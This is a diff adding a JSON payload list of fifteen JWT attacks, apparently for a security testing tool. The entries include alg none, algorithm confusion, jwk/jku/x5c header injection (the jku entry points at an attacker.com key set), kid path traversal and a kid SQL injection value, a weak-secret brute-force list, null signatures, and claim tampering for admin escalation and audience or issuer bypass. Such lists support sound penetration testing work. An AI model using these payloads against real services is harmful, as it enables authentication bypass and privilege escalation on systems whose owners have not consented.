@@ -1,0 +1,17 @@
+[
+  {"name":"Algorithm None","category":"JWT","description":"Change alg to none to bypass signature verification","payload":"{\"alg\":\"none\",\"typ\":\"JWT\"}","tags":["alg-none","critical"]},
+  {"name":"RS256 to HS256","category":"JWT","description":"Switch RSA to HMAC using public key as secret","payload":"{\"alg\":\"HS256\",\"typ\":\"JWT\"}","tags":["algorithm-confusion","critical"]},
+  {"name":"jwk Header Injection","category":"JWT","description":"Inject attacker JWK into JWT header","payload":"{\"alg\":\"RS256\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"<attacker_modulus>\",\"e\":\"AQAB\"},\"typ\":\"JWT\"}","tags":["jwk-injection","critical"]},
+  {"name":"jku Header Injection","category":"JWT","description":"JKU pointing to attacker-controlled JWKS","payload":"{\"alg\":\"RS256\",\"jku\":\"https://attacker.com/.well-known/jwks.json\",\"typ\":\"JWT\"}","tags":["jku","ssrf"]},
+  {"name":"kid Path Traversal","category":"JWT","description":"kid header path traversal to known file","payload":"{\"alg\":\"HS256\",\"kid\":\"../../../../../../dev/null\",\"typ\":\"JWT\"}","tags":["kid","path-traversal","lfi"]},
+  {"name":"kid SQL Injection","category":"JWT","description":"SQL injection via kid header","payload":"{\"alg\":\"HS256\",\"kid\":\"' UNION SELECT 'attacker_secret'--\",\"typ\":\"JWT\"}","tags":["kid","sqli"]},
+  {"name":"Weak Secret Brute","category":"JWT","description":"Common weak secrets to try","payload":"secret\npassword\n123456\nadmin\ntest\njwtsecret\nyourjwtsecret","tags":["brute-force","weak-secret"]},
+  {"name":"Null Signature","category":"JWT","description":"JWT with empty signature","payload":"<header>.<payload>.","tags":["null-signature","bypass"]},
+  {"name":"Expired Token Replay","category":"JWT","description":"Test if expired tokens are accepted","payload":"{\"exp\":1}","tags":["expiry","replay"]},
+  {"name":"Admin Privilege Escalation","category":"JWT","description":"Modify role claim to admin","payload":"{\"sub\":\"user\",\"role\":\"admin\",\"iat\":1700000000}","tags":["privilege-escalation","claim-manipulation"]},
+  {"name":"Embedded JWK Self-Signed","category":"JWT","description":"Self-signed JWT with embedded public key","payload":"{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"base64url_modulus\",\"e\":\"AQAB\",\"kid\":\"attacker\"}}","tags":["jwk","self-signed","advanced"]},
+  {"name":"x5c Header Injection","category":"JWT","description":"X.509 certificate chain injection","payload":"{\"alg\":\"RS256\",\"x5c\":[\"<attacker_cert_base64>\"],\"typ\":\"JWT\"}","tags":["x5c","certificate"]},
+  {"name":"crit Header Bypass","category":"JWT","description":"crit header to confuse parser","payload":"{\"alg\":\"HS256\",\"crit\":[\"nonexistent\"],\"nonexistent\":\"value\",\"typ\":\"JWT\"}","tags":["crit","bypass","parser"]},
+  {"name":"Audience Bypass","category":"JWT","description":"Remove or modify aud claim","payload":"{\"sub\":\"user\",\"aud\":\"any_audience\",\"exp\":9999999999}","tags":["aud","bypass"]},
+  {"name":"Issuer Confusion","category":"JWT","description":"Modify iss claim for confusion attacks","payload":"{\"sub\":\"user\",\"iss\":\"trusted-issuer\",\"exp\":9999999999}","tags":["iss","confusion"]}
+]
